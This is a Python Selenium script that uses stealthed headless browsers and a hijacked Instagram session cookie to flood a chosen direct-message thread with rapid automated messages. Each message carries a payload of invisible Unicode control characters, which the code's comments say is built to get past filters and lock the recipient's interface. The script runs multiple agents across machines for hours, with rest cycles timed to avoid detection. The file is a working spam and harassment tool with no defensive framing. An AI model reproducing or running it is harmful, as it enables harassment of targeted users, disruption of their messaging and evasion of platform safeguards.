# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (4-AGENT MATRIX V18)
# 📅 STATUS: STABLE-IMPACT | 4-AGENT TOTAL | DOCKER-READY

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium_stealth import stealth
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# --- 4 AGENTS TOTAL CONFIG ---
# (Set to 2 here; with 2 GitHub machines, total = 4)
AGENTS_PER_MACHINE = 2             
TOTAL_DURATION = 25000 
BURST_SPEED = (0.1, 0.4)
SESSION_LIMIT = 180       
REST_AFTER_STRIKES = 100   
REST_DURATION = 5          

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()
BROWSER_LAUNCH_LOCK = threading.Lock()
sys.stdout.reconfigure(encoding='utf-8')

def get_max_heavy_payload():
    u_id = random.randint(100, 999)
    glue = "\u2060" 
    iso, pop = "\u2068", "\u2069"
    # Clean header to bypass filters, heavy body to lock UI
    header = f"👑 𝖯𝖱𝖠𝖵𝖤𝖤𝖱 𝖯𝖠𝖯𝖠 👑 [NODE:{u_id}]"
    body = [f"{iso}\u202E\u2800{glue}{pop}" for i in range(230)]
    return f"{header}\n{glue.join(body)}".strip()[:9998]

def log_status(agent_id, msg):
    timestamp = datetime.datetime.now().strftime("%H:%M:%S")
    machine = os.environ.get('MACHINE_ID', '1')
    print(f"[{timestamp}] M-{machine} Agent {agent_id}: {msg}", flush=True)

def get_driver(agent_id):
    with BROWSER_LAUNCH_LOCK:
        chrome_options = Options()
        chrome_options.add_argument("--headless=new") 
        chrome_options.add_argument("--no-sandbox") 
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-gpu")
        
        ua = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
        chrome_options.add_argument(f"user-agent={ua}")
        
        temp_dir = os.path.join(tempfile.gettempdir(), f"node_{agent_id}_{int(time.time())}")
        chrome_options.add_argument(f"--user-data-dir={temp_dir}")
        driver = webdriver.Chrome(options=chrome_options)
        
        stealth(driver, languages=["en-US"], vendor="Apple Inc.", platform="iPhone", fix_hairline=True)
        driver.custom_temp_path = temp_dir
        return driver

def adaptive_send(driver, text):
    try:
        wait = WebDriverWait(driver, 25)
        box = wait.until(EC.presence_of_element_located((By.XPATH, "//div[@role='textbox'] | //textarea")))
        
        # Injecting via JS is more reliable for heavy payloads
        driver.execute_script("""
            var el = arguments[0];
            el.focus();
            document.execCommand('insertText', false, arguments[1]);
            el.dispatchEvent(new Event('input', { bubbles: true }));
        """, box, text)
        
        time.sleep(0.5)
        box.send_keys(Keys.ENTER)
        
        # Fallback click
        try:
            send_btn = driver.find_element(By.XPATH, "//button[text()='Send'] | //div[@role='button'][text()='Send']")
            driver.execute_script("arguments[0].click();", send_btn)
        except: pass
        
        return True
    except: return False

def run_life_cycle(agent_id, cookie, target):
    global_start = time.time()
    while (time.time() - global_start) < TOTAL_DURATION:
        driver = None
        strike_counter = 0
        try:
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
            
            log_status(agent_id, "📡 Syncing Socket...")
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            
            time.sleep(15) # Wait for socket stability
            
            if adaptive_send(driver, "🚀 MATRIX NODE ONLINE"):
                log_status(agent_id, "✅ Connection Established.")
            else:
                log_status(agent_id, "⚠️ Sync timeout. Retrying...")
                continue

            while (time.time() - global_start) < TOTAL_DURATION:
                payload = get_max_heavy_payload()
                if adaptive_send(driver, payload):
                    strike_counter += 1
                    with COUNTER_LOCK:
                        global GLOBAL_SENT
                        GLOBAL_SENT += 1
                    
                    if strike_counter % REST_AFTER_STRIKES == 0:
                        log_status(agent_id, f"✅ Cycle Complete. Resting...")
                        time.sleep(REST_DURATION)
                    else:
                        log_status(agent_id, f"Delivered (Total: {GLOBAL_SENT})")
                        
                time.sleep(random.uniform(*BURST_SPEED))
        except: pass
        finally:
            if driver: driver.quit()
            time.sleep(5)

def main():
    cookie = os.environ.get("INSTA_COOKIE", "").strip()
    target = os.environ.get("TARGET_THREAD_ID", "").strip()
    with ThreadPoolExecutor(max_workers=AGENTS_PER_MACHINE) as executor:
        for i in range(AGENTS_PER_MACHINE):
            executor.submit(run_life_cycle, i+1, cookie, target)

if __name__ == "__main__":
    main()
